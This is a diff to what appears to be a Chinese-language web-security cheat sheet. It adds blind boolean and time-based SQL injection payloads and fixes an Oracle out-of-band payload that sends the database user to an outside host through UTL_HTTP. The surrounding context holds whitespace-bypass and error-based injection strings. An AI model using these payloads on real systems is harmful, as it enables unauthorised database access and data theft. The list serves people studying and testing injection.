@@ -298,6 +298,14 @@ cat $(ls)
         - `select ST_PointFromGeoHash(version(),1);`
 
 - Blind Based (Time/Boolean)
+    - Boolean
+        - 「有」跟「沒有」
+        - `id=87 and length(user())>0`
+        - `id=87 and length(user())>100`
+    - Time
+        - 用在啥結果都看不到時
+        - `id=87 and if(length(user())>0, sleep(10), 1)=1`
+        - `id=87 and if(length(user())>100, sleep(10), 1)=1`
 - 繞過空白檢查
     - `id=-1/**/UNION/**/SELECT/**/1,2,3`
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
@@ -379,12 +387,12 @@ cat $(ls)
 - Error Based
     - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
 - Out of band
-    - `UTL_HTTP.request('http://kaibro.tw/'||(sele ct user from dual))=1`
+    - `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`
 
 ## SQLite
 
 - 子字串：
-    - `substr(“abc",1,1)   =>   ‘a’`
+    - `substr(“abc",1,1)   =>   'a'`
 - Ascii function:
     - `unicode('d') => 100`
 - legth
